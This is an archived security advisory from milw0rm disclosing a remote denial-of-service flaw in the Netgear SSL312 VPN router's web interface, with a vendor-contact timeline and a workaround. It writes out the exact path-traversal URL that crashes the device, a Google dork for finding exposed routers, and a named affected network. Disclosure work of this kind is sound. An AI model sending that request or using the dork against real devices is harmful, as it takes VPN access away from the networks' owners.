@@ -1,0 +1,73 @@
+                     _   _ _____ _     ___ _____ _   _
+                   / / / / ____/ /   /  _/_  __/ / / /
+                  / /_/ / __/ / /    / /  / / / /_/ /
+                 / __  / /___/ /____/ /  / / / __  /
+                /_/ /_/_____/_____/___/ /_/ /_/ /_/
+                           Helith - 0815
+--------------------------------------------------------------------------------
+
+Author		 : Rembrandt
+Date		 : 2008-02-27
+Affected Software: propietary CGI
+Affected OS	 : Netgear embedded Linux for the SSL312 router
+		   Propably other devices are affected as well
+Type		 : Denial of Service
+
+OSVDB		 : 
+Milw0rm		 : 8008
+CVE		 : 
+ISS X-Force:	 : 
+BID		 : 33675
+
+
+Trying to fix it responsible and get in contact with the vendor:
+
+-- ZDI --
+Case Opened  	2008-12-28 07:57 GMT-6
+Case Closed 	2009-01-15 17:01 GMT-6
+
+"After some deliberation we have unfortunately decided that we won't be
+accepting bugs affecting NetGear products."
+-- END --
+
+Contacting Netgear and mitre.org: 2009-02-01 12:25 GTM+1
+No reaction, release		: 2009-02-06 23:59 GTM+1
+
+Netgear VPN router SSL312 is proune to a remote DoS condition which can get
+triggered if somebody has access to the webinterface of the VPN router.
+The problem is related to a propietary CGI binary and makes is impossible
+for users to patch the router. Further in detail analyses will show several
+other issues like outdated third party software (e.g. the webserver) and further
+problems in the cgi-binary itself which won't get disclosed here.
+
+If you download the source code the affected binary can be found at:
+./NG_SSL312-GPL/uClinux/uC-src/real/EasyAccess/EasyAccess/www/cgi-bin/single_cgi
+
+
+Steps to reproduce:
+
+Visit the Netgear SSL312 VPN router webinterface.
+You will see a login field and a password field.
+Just enter any random data and proceed.
+
+The URL will include a path like:
+https://xxx.xxx.xxx.xxx/cgi-bin/welcome/VPN_only?err=VXNlciBMb2dpbiBGYWlsZWQ=
+
+If you modify the URL as below and resend your http request the device will
+crash and needs a hard reboot.
+
+https://xxx.xxx.xxx.xxx/cgi-bin/welcome/VPN_only?../../../../../
+
+Example network affected by this: StudiVZ
+
+Simple google dork:
+intitle:SSL-VPN intext:password inurl:/cgi-bin/welcome
+
+Workaround:
+Preventing others to gain access to the webinterface of the router prevents
+the attack.
+
+Kind regards,
+Rembrandt
+
+# milw0rm.com [2009-02-09]
